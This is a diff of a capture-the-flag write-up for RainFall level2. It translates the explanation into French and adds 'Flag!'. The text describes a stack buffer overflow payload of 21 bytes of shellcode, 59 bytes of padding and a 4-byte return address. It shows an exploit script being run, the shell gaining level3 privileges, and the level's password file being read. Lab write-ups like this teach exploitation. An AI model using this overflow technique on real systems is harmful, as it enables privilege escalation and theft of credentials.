@@ -188,8 +188,8 @@ es             0x7b     123
 fs             0x0      0
 gs             0x33     51
 ```
-in eax the buffer is at address 0xbffff6dc, lets try to inject here.
-Our shell code is 21 bytes long, the limit is 80 bytes so we first have our 21 bytes shellcode then 59 random bytes then 4 bytes for the address
+Dans eax le buffer est à 0xbffff6dc, essayond 'injecter ici.
+Le shellcode fait 21 octets, la limite est de 80, donc le payload est constitué de 21 octets + 59 octets random + 4 octets pour l'adresse, soit 80 octets au total.
 ```
 level2@RainFall:~$ python /tmp/exploit3.py  0xbffff6dc 59
 crafting payload...
@@ -229,3 +229,5 @@ uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
+Flag!
